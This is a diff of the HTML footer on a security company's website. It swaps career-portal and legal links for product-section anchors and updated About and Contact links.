-          <li><a href="https://career.hadess.io/coach" style="font-size:13px;color:var(--text-muted)">Find a Coach</a></li>
-          <li><a href="https://career.hadess.io/roadmap-selector" style="font-size:13px;color:var(--text-muted)">Roadmap Selector</a></li>
-          <li><a href="https://career.hadess.io/salary-calculator" style="font-size:13px;color:var(--text-muted)">Salary Calculator</a></li>
-          <li><a href="https://career.hadess.io/tax-calculator" style="font-size:13px;color:var(--text-muted)">Tax Calculator</a></li>
-          <li><a href="https://career.hadess.io/knowledge-model" style="font-size:13px;color:var(--text-muted)">Knowledge Model</a></li>
-          <li><a href="https://career.hadess.io/pricing" style="font-size:13px;color:var(--text-muted)">Pricing</a></li>
+          <li><a href="/products/#career" style="font-size:13px;color:var(--text-muted)">Career</a></li>
+          <li><a href="/products/#asm" style="font-size:13px;color:var(--text-muted)">Attack Surface Management</a></li>
+          <li><a href="/products/#sast" style="font-size:13px;color:var(--text-muted)">SAST</a></li>
+          <li><a href="/products/#red-team" style="font-size:13px;color:var(--text-muted)">Red Team Operations</a></li>
+          <li><a href="/products/#vulnerability-research" style="font-size:13px;color:var(--text-muted)">Vulnerability Research</a></li>
         </ul>
       </div>
       <!-- Resources -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Resources</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/knowledge-base" style="font-size:13px;color:var(--text-muted)">Knowledge Base</a></li>
-          <li><a href="https://career.hadess.io/case-studies" style="font-size:13px;color:var(--text-muted)">Case Studies</a></li>
           <li><a href="/blog" style="font-size:13px;color:var(--text-muted)">Learning Materials</a></li>
-          <li><a href="https://career.hadess.io/certificate-roadmap" style="font-size:13px;color:var(--text-muted)">Certification Prep</a></li>
-          <li><a href="https://career.hadess.io/games/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Hack &amp; Learn</a></li>
           <li><a href="https://discord.gg/4XR3wWn3wp" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">Community</a></li>
         </ul>
       </div>
       <!-- Company + Legal -->
       <div class="ft-col"><h3 style="font-size:15px;font-weight:600;color:#fff;margin-bottom:16px">Company</h3>
         <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="/" target="_blank" rel="noopener noreferrer" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
-          <li><a href="https://career.hadess.io/mission" style="font-size:13px;color:var(--text-muted)">Our Mission</a></li>
-          <li><a href="mailto:career@hadess.io" style="font-size:13px;color:var(--text-muted)">Support</a></li>
-        </ul>
-        <h3 style="font-size:15px;font-weight:600;color:#fff;margin:28px 0 16px">Legal</h3>
-        <ul style="list-style:none;display:flex;flex-direction:column;gap:10px">
-          <li><a href="https://career.hadess.io/terms" style="font-size:13px;color:var(--text-muted)">Terms of Service</a></li>
-          <li><a href="https://career.hadess.io/privacy" style="font-size:13px;color:var(--text-muted)">Privacy Policy</a></li>
-          <li><a href="https://career.hadess.io/cancellation-policy" style="font-size:13px;color:var(--text-muted)">Cancellation Policy</a></li>
-          <li><a href="https://career.hadess.io/cookie-policy" style="font-size:13px;color:var(--text-muted)">Cookie Policy</a></li>
-          <li><a href="https://career.hadess.io/imprint" style="font-size:13px;color:var(--text-muted)">Imprint</a></li>
-          <li><a href="https://career.hadess.io/dmca" style="font-size:13px;color:var(--text-muted)">DMCA Notice</a></li>
-          <li><a href="https://career.hadess.io/image-rights" style="font-size:13px;color:var(--text-muted)">Image Rights</a></li>
-          <li><a href="https://career.hadess.io/security" style="font-size:13px;color:var(--text-muted)">Security</a></li>
+          <li><a href="/about-us/" style="font-size:13px;color:var(--text-muted)">About HADESS</a></li>
+          <li><a href="mailto:security@hadess.io" style="font-size:13px;color:var(--text-muted)">Contact</a></li>
         </ul>
       </div>
     </div>
